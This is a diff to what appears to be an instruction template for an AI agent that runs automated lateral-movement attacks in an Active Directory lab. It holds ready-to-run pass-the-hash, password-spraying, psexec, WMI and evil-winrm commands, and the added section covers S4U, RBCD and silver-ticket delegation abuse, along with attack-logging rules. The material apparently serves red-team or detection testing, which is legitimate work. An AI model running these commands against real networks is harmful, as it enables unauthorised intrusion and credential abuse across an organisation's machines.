@@ -25,10 +25,10 @@ If NTLM hashes are available from Kerberoast/AS-REP:
 
 ```bash
 # Test PtH against Win10
-crackmapexec smb 172.16.20.103 -u administrator -H NTLM_HASH_HERE 2>&1
+nxc smb 172.16.20.103 -u administrator -H NTLM_HASH_HERE 2>&1
 
 # Execute command via WMI with hash
-wmiexec.py {{domain}}/administrator@172.16.20.103 -hashes :NTLM_HASH_HERE \
+impacket-wmiexec {{domain}}/administrator@172.16.20.103 -hashes :NTLM_HASH_HERE \
   'whoami' 2>&1
 ```
 
@@ -43,11 +43,11 @@ CRACKED_USER=$(jq -r '.cracked[0].user // empty' {{logDir}}/cracked_creds.json)
 CRACKED_PASS=$(jq -r '.cracked[0].password // empty' {{logDir}}/cracked_creds.json)
 
 # Spray cracked password across domain
-crackmapexec smb 172.16.20.0/24 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
+nxc smb 172.16.20.0/24 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
   --continue-on-success 2>&1
 
 # Get shell via psexec
-psexec.py {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
+impacket-psexec {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
 ```
 
 ## Attack 3: WinRM / Evil-WinRM (T1021.006)
@@ -57,6 +57,23 @@ psexec.py {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
 evil-winrm -i 172.16.20.103 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
   -c "whoami; hostname; ipconfig" 2>&1
 ```
+
+## S4U / RBCD Delegation (if needed)
+
+If standard lateral movement fails, try constrained/unconstrained delegation. Follow this STRUCTURED approach:
+
+**Max 3 attempts per technique. Track each attempt.**
+
+1. First try: impacket-getST with the SPN from Kerberoasting
+2. Second try: RBCD abuse via rbcd.py if write access to msDS-AllowedToActOnBehalfOfOtherIdentity
+3. Third try: Silver ticket if we have a service hash
+
+After each attempt:
+- Call `memory_append("lateral", "S4U attempt N: [technique] -> [result]")`
+- If attempt fails, read the error and change approach -- do NOT retry the same command
+- After 3 total failures across all S4U techniques, move on
+
+NEVER: Write custom C# code. Use only impacket tools.
 
 ## Output
 
@@ -84,6 +101,11 @@ Log each movement with `log_attack`:
 - SOAR fired: yes/no + blocked IP
 ```
 If you gained admin access, call `memory_append("session", "- Admin access: user:pass on host (method)")`.
+
+## Logging Protocol (MANDATORY)
+For every significant action, call `log_attack` TWICE:
+1. **Before execution**: result="skipped", details="STARTING: [what you're about to do]"
+2. **After result**: result="success"/"failed"/"blocked", details="RESULT: [what happened]"
 
 ## Rules
 - Delay {{delayMin}}-{{delayMax}} seconds between attempts
